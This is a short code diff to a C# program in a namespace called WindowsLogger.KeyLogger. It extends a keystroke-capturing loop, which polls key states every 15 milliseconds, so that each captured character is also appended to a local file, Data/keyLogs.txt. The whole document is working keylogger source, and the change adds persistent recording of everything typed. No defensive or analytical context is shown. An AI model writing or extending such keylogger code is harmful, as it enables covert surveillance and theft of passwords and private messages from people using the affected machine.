@@ -18,6 +18,15 @@ namespace WindowsLogger.KeyLogger
 
 		public void run()
 		{
+			string filepath = "./Data/keyLogs.txt";
+
+			if(!File.Exists(filepath))
+            {
+				using (StreamWriter sw = File.CreateText(filepath)) 
+				{
+					
+				}
+            }
 			while (true)
 			{
 				Thread.Sleep(15);
@@ -27,6 +36,10 @@ namespace WindowsLogger.KeyLogger
 					if (keyState == 32769)
 					{
 						Console.Write((char) i);
+						using (StreamWriter sw = File.AppendText(filepath))
+                        {
+							sw.Write((char)i);
+                        }
 					} 
 				}
 			}
